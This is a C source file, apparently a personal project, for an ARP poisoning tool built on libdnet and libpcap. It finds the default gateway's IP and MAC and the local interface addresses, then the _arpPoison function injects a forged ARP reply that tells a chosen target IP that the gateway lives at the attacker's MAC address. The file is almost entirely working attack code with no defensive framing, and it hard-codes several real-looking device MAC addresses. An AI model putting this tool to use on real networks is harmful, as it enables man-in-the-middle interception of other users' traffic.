#include <stdio.h>
#include <unistd.h>
#include <dnet.h>
#include <string.h>
#include <stdlib.h>
#include "pcap.h"

static void getDefaultGatewayIp(struct addr* ip){
    route_t* router = route_open();

    struct route_entry entry;

    addr_pton("8.8.8.8", &entry.route_dst);

    route_get(router, &entry);

    memmove(ip, &entry.route_gw, sizeof(struct addr));
    printf("gw ip is %s\n", addr_ntoa(&entry.route_gw));
    route_close(router);

}
static int _findHwAddrLoop(const struct arp_entry* entry, void* arg){
    struct arp_entry* target = (struct arp_entry*)arg;
    if ( target->arp_pa.addr_ip == entry->arp_pa.addr_ip){
        memmove(&target->arp_ha, &entry->arp_ha,
                sizeof(struct addr));
    }
    return 0;
}
static void getDefaultGatewayHw(struct addr* buf){
    struct arp_entry entry;
    getDefaultGatewayIp(&entry.arp_pa);

    printf("gw ip is %s\n", addr_ntoa(&entry.arp_pa));
    arp_t* arper = arp_open();
    int ec = arp_get(arper, &entry);
    if (ec != 0){
        arp_loop(arper, _findHwAddrLoop, &entry);
        if (entry.arp_ha.addr_type == 0){
            printf("Could not find hardware address of default gateway\n");
            exit(2);
        }
    }
    memmove(buf, &entry.arp_ha, sizeof(struct addr));
}

static void getHostHw(struct addr* buf, char* device){
    eth_t* eth = eth_open(device);
    eth_addr_t ethAddr;

    eth_get(eth, &ethAddr);
    memmove(&buf->addr_eth, &ethAddr, 6);
    eth_close(eth);
}



static void getHostIp(struct addr* buf, char* device){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *alldevs;
    int status = pcap_findalldevs(&alldevs, errbuf);
    if(status != 0) {
        printf("pcap_findalldevs: %s\n", errbuf);
        return;
    }

    for(pcap_if_t *d=alldevs; d!=NULL; d=d->next) {
        //printf("%s:", d->name);
        for(pcap_addr_t *a=d->addresses; a!=NULL; a=a->next) {
            if(a->addr->sa_family == AF_INET){
                //printf(" %s", inet_ntoa(((struct sockaddr_in*)a->addr)->sin_addr));
                if (strcmp(d->name, device) == 0){
                    memmove(&buf->addr_ip, &(((struct sockaddr_in*)a->addr)->sin_addr), 4);
                    return;
                }
            }
        }
        //printf("\n");
    }
    pcap_freealldevs(alldevs);
    return ;
}

#define ETH_PROTO_ARP 0x0806
static void fillEthPacket(ether_h* eth,
        uint8_t* dst_hw,
        uint8_t* src_hw,
        uint16_t proto){
    memmove(eth->dst_hw, dst_hw, 6);    
    memmove(eth->src_hw, src_hw, 6);    
    eth->protocol = htons(proto);
};


#define ARP_REQUEST 1
#define ARP_REPLY 2
static uint8_t* getArpPacket(
        void* packet,
        int operation,
        uint8_t* srcHw,
        uint32_t srcIp,
        uint8_t* dstHw,
        uint32_t dstIp
        ){
    static uint8_t bc[] = {0xff,0xff,0xff,0xff,0xff,0xff};
    if (packet == NULL){
        packet = malloc(sizeof(arp_h) + sizeof(ether_h));
    }
    ether_h* eth = (ether_h*)(packet);

    if (operation == ARP_REQUEST){
        fillEthPacket(eth, bc, srcHw, ETH_PROTO_ARP);
    }else if (operation == ARP_REPLY){
        fillEthPacket(eth, dstHw, srcHw, ETH_PROTO_ARP);
    }else{
        printf("Invalid arp operation\n");
        exit(2);
    }

    arp_h* arp = (arp_h*)(packet + sizeof(ether_h));//ETHER_H_SIZE);

    // 1 for ethernet
    arp->hw_type = htons(0x1);

    // 0x0800 for IPv4
    arp->protocol = htons(0x0800);

    arp->hwlen = 6;
    arp->protolen = 4;

    arp->op = htons(operation);

    // TODO fix the struct so this isn't necessary.
    // move hw/ip addresses in manually to avoid struct
    // padding problems.
    memmove(arp->src_hw, srcHw, 6);
    memmove(arp->src_hw + 6, (uint8_t*)(&srcIp), 4);

    memmove(arp->src_hw + 10, dstHw, 6);
    memmove(arp->src_hw + 16, (uint8_t*)(&dstIp), 4);

    return (uint8_t*)eth;
}

static void freeArpPacket(void* packet){
    if (packet !=  0){
        free(packet);
    }
}
static uint32_t IP(char* ip){
    struct in_addr addr;
    inet_aton(ip, &addr);
    return addr.s_addr;
}
uint8_t hwBc[] = {0xff,0xff,0xff,0xff,0xff,0xff};
static uint8_t zeros[]= {0,0,0,0,0,0};
int getMacAddress(struct addr* ip, struct addr* hwbuf){
    struct pcap_pkthdr header;  /* The header that pcap gives us */
    memset(&header,0,sizeof(struct pcap_pkthdr));  /* The header that pcap gives us */
    const u_char *packet;       /* The actual packet */
    char filter_exp[60];

    sprintf(filter_exp, "arp[14:4] == %u", ntohl(ip->addr_ip));
    printf("%s (%s)\n", filter_exp, addr_ntoa(ip));

    pcap_t* handle = setPromiscuous(Settings.device, filter_exp);
    uint8_t* arpRequest = getArpPacket( NULL,
            ARP_REQUEST, 
            (uint8_t*)&Settings.hostHw.addr_eth, 
            Settings.hostIp.addr_ip, 
            hwBc, 
            ip->addr_ip);
    pcap_inject(handle, arpRequest, ARP_H_SIZE + ETHER_H_SIZE);
    freeArpPacket(arpRequest);
    while(!header.len){
        packet = pcap_next(handle, &header);
        printf("skipping..\n");
    }

    if (header.len < (ARP_H_SIZE+ETHER_H_SIZE)){
        printf("received invalid packet of length %d/%d.\n", header.len, ARP_H_SIZE+ETHER_H_SIZE);
        return 1;
    }
    arp_h* arpReply = (arp_h*)(packet + ETHER_H_SIZE);
    printf("recieved MAC: \n");
    for(int i=0; i<6; i++){
        printf("%x:", (arpReply->src_hw[i]));
    }
    printf("\n");
    memmove(&hwbuf->addr_eth, arpReply->src_hw, 6);
    /* And close the session */
    pcap_close(handle);
    return 0;
}


uint8_t hwAndroid[] = {0xf0,0x27,0x65,0xff,0xde,0x43};
void _arpPoison(struct addr* targetIp, struct addr* recordIp, struct addr* recordHw){
    pcap_t* cap = setPromiscuous(Settings.device,"arp");

    printf("making arp packet...\n");
    struct addr targetHw;
    getMacAddress(targetIp, &targetHw);
    uint8_t* arp = getArpPacket(NULL,
            ARP_REPLY,
            (uint8_t*)&recordHw->addr_eth,
            recordIp->addr_ip,
            (uint8_t*)&targetHw.addr_eth,
            targetIp->addr_ip
            );



    printf("sending arp packet...\n");

    pcap_inject(cap, arp, ETHER_H_SIZE + ARP_H_SIZE);
}

void initHost(char* device){
    getHostHw(&Settings.hostHw, device);
    getHostIp(&Settings.hostIp, device);
    printf("host ip for %s: %s\n",device, addr_ntoa(&Settings.hostIp));
    Settings.device = device;
}
uint8_t hwTap1[] = {0xca, 0xfe, 0xba, 0xaa, 0xbe, 0x00};
uint8_t hwTap2[] = {0xca, 0xfe, 0xba, 0xaa, 0xbe, 0x01};
uint8_t hwLoc[] = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0};
uint8_t hwWlan[] = {0x54, 0x27, 0x1e, 0xef, 0x04, 0x11};

// desktop
//uint8_t hwEth[] = {0x10, 0xc3, 0x7b, 0x4d, 0xc2, 0xbc};
// laptop
uint8_t hwEth[] = {0x3c,0x97,0x0e,0x1f,0xce,0x5f};
// 10:c3:7b:4d:c2:bc
uint8_t hwRouter[] = {0xe0, 0x3f, 0x49, 0x9c, 0x67, 0x58};
uint8_t hwLaptop[] = {0x60, 0x67, 0x20, 0x2b, 0x34, 0x94};

int main(int argc, char* argv[]){
    if (getuid() != 0){
        printf("Must be root.\n");    
        return 1;
    }
    if (argc < 3){
        printf("usage: ./%s <interface> <target ip>\n", argv[0]);
        return 1;
    }
    struct addr routerHw;
    struct addr gwIp;
    struct addr targetIp;
    initHost(argv[1]);
    getDefaultGatewayHw(&routerHw);
    getDefaultGatewayIp(&gwIp);

    // test against hard coded values to make sure functions worked.
    for(int i=0; i<6; i++){
        //if (routerHw[i] != hwRouter[i]){
        //    printf("gateway hw addr doesn't match\n");
        //    return 2;
        //}    
        //if (hostHw[i] != hwLaptop[i]){
        //    printf("host hw addr doesn't match\n");
        //    return 2;
        //}    
    }

    addr_pton(argv[2], &targetIp);
    _arpPoison(&targetIp, &gwIp, &Settings.hostHw);

    return 0;
}


